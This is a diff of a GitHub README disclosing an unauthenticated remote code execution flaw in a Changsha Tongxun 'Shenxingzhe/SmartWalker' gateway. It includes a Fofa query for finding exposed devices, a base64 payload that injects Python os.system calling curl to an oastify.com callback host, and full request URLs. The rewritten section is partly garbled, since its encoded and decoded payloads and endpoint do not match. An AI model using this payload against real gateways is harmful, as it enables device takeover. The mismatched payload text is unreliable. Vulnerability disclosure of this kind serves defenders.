@@ -1,21 +1,51 @@
 # The-gateway-of-the-Smart-Walker-is-not-authorized-for-remote-code-execution-RCE-
-The Shenxingzhe gateway of Changsha Tongxun Computer Technology Co., Ltd. has an unauthorized remote code execution (RCE) vulnerability
-Fofa：cert.sn="9371290284317297864" &&title="网关"
-Choose any asset at random
-https://example.75:4433/login/?nLang=0
-<img width="832" height="508" alt="image" src="https://github.com/user-attachments/assets/42cc1d01-f0f9-4c04-a067-7697ae10ecbe" />
+Unauthenticated Remote Code Execution (RCE) in SmartWalker Gateway 
+Summary 
 
-Payload and chkid are base64 encoded
-https://example:4433/?title=1&oIp=1&chkid=eydzVXNlckNvZGUnOiBfX2ltcG9ydF9fKCdvcycpLnN5c3RlbSgnY3VybCBuamFleHFxdHZmZTNoOXYzazVqbGFlaTJ5dDRrc2JnMC5vYXN0aWZ5LmNvbScpLCAnc1B3ZCc6IDB9
+A critical unauthenticated remote code execution (RCE) vulnerability exists in the Shenxingzhe gateway manufactured by Changsha Tongxun Computer Technology Co., Ltd. An attacker can execute arbitrary system commands on the device without authentication. 
+Description 
 
-original value：
-{'sUserCode': __import__('os').system('cur njaexqqtvfe3h9v3k5jlaei2yt4ksbg0.oastify.com'), 'sPwd': 0}
-<img width="832" height="288" alt="image" src="https://github.com/user-attachments/assets/7e673f05-3b1c-4fdd-a669-87272484cce2" />
+The gateway's web management interface (as shown in the attached image) has a design flaw in its backend logic. A specific function accepts Python code via the sUserCode parameter and executes it. An attacker can craft a request containing malicious code, bypassing authentication, and execute system commands directly on the server. 
+Proof of Concept (PoC) 
 
-Payload function:
-Next, try executing a system command to request my DNS logs
-<img width="830" height="152" alt="image" src="https://github.com/user-attachments/assets/4b4dc083-cc6a-468f-9860-cb4e74c13455" />
+    Prepare the Payload:
+    Encode the following Python command in Base64: 
+    python
+     
 
-Check the DNSlog and confirm that the request has been successfully received
-Successful command execution
-<img width="830" height="130" alt="image" src="https://github.com/user-attachments/assets/15eb76f7-1f4a-48e7-8bde-0e805e2cde44" />
+ 
+1
+import('os').system('curl njaexqxtvfe3h9v3k5jlaei2y14ksbg0.oastify.com')
+ 
+ 
+
+The Base64 encoded string is: 
+ 
+ 
+1
+eydzVXNlckNvZGU6J2ltcG9ydCgnc29zJykuc3lzdGVtKCdjdXJsIG5qYWV4cXh0dmZlM2g5djNrNWpsYWVpMnl1NGtzYmcwLm9hc3RpZnkuY29tJyk=
+ 
+ 
+
+Send the Request:
+Send a GET request to the /login?nl.lang=0 endpoint on the target gateway, including the encoded payload in the chkid parameter. 
+ 
+
+     
+    1
+    https://<GATEWAY_IP>:4433/login?nl.lang=0&title=1&oip=1&chkid=eydzVXNlckNvZGU6J2ltcG9ydCgnc29zJykuc3lzdGVtKCdjdXJsIG5qYWV4cXh0dmZlM2g5djNrNWpsYWVpMnl1NGtzYmcwLm9hc3RpZnkuY29tJyk=
+     
+     
+
+    (Note: The value of chkid is the Base64 string from step 1) 
+
+    Verify Execution:
+    As shown in the attached image, a DNS query log is observed on the oastify.com service from the target gateway's IP address (172.253.5.18), confirming that the curl command was successfully executed on the device. 
+     
+
+Impact 
+
+An unauthenticated remote attacker can execute arbitrary system commands on the gateway, leading to complete compromise of the device. This could allow for further lateral movement within the local network. 
+Remediation 
+
+Immediate action is required. Disable the web management interface if possible and contact the vendor for an official security patch. The underlying issue stems from the sUserCode parameter functionality, which should be removed or strictly controlled to prevent arbitrary command execution. 
